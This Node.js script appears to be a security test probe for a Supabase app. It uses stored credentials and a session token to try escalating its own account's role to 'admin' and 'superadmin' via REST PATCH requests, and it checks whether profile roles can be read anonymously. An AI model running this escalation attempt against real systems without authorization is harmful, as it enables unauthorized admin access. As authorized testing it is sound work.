#!/usr/bin/env node
'use strict';

const https = require('https');
const fs = require('fs');
const path = require('path');

const CRED_DIR = path.join(__dirname, '..', 'credentials');
const secrets = JSON.parse(fs.readFileSync(path.join(CRED_DIR, 'secrets.json'), 'utf8'));
const projectUrl = secrets.secrets.find(s => s.type === 'supabase_project_url').value;
const anonKey = secrets.secrets.find(s => s.type === 'supabase_anon_key').value;
const base = new URL(projectUrl);

const session = JSON.parse(fs.readFileSync(path.join(__dirname, 'session.json'), 'utf8'));
const authToken = session.access_token;
const userId = session.user.id;
const SENSITIVE = new Set(['email', 'phone', 'name', 'sub', 'session_id']);

function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === 'object') {
    return Object.fromEntries(Object.entries(value).map(([key, item]) => [
      key,
      SENSITIVE.has(key.toLowerCase()) ? '<redacted>' : redact(item),
    ]));
  }
  return value;
}

function request(pathname, { method = 'GET', auth = false, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = {
      apikey: anonKey,
      Authorization: `Bearer ${auth ? authToken : anonKey}`,
      Accept: 'application/json',
    };
    if (method === 'PATCH') headers.Prefer = 'return=representation';
    if (data) {
      headers['Content-Type'] = 'application/json';
      headers['Content-Length'] = Buffer.byteLength(data);
    }
    const req = https.request({
      hostname: base.hostname,
      path: pathname,
      method,
      headers,
    }, res => {
      let responseBody = '';
      res.on('data', chunk => responseBody += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: responseBody }));
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

async function main() {
  console.log('=== Role Escalation Probe ===\n');
  console.log('All writes target the authorized test account only.\n');

  console.log('--- Profiles visible to test account ---\n');
  let r = await request('/rest/v1/profiles?select=role', { auth: true });
  console.log(`Status: ${r.status}`);
  if (r.status === 200) {
    const rows = JSON.parse(r.body);
    console.log(`Rows visible: ${rows.length}`);
    console.log(`Roles: ${rows.map(row => row.role).join(', ')}`);
  }

  for (const role of ['admin', 'superadmin']) {
    console.log(`\n--- Self-role update to "${role}" (test account only) ---\n`);
    r = await request(`/rest/v1/profiles?id=eq.${userId}`, {
      method: 'PATCH',
      auth: true,
      body: { role },
    });
    console.log(`Status: ${r.status}`);
    console.log(`Body: ${r.body.slice(0, 220)}`);
  }

  console.log('\n--- Verify current role ---\n');
  r = await request(`/rest/v1/profiles?select=role&id=eq.${userId}`, { auth: true });
  console.log(`Status: ${r.status}`);
  console.log(`Body: ${r.body}`);

  console.log('\n--- Anonymous role read ---\n');
  r = await request('/rest/v1/profiles?select=role', { auth: false });
  console.log(`Status: ${r.status}`);
  console.log(`Body: ${r.body}`);

  console.log('\n--- JWT metadata claims (PII redacted) ---\n');
  console.log('app_metadata:', JSON.stringify(redact(session.user.app_metadata), null, 2));
  console.log('user_metadata:', JSON.stringify(redact(session.user.user_metadata), null, 2));
}

main().catch(err => { console.error(err); process.exit(1); });
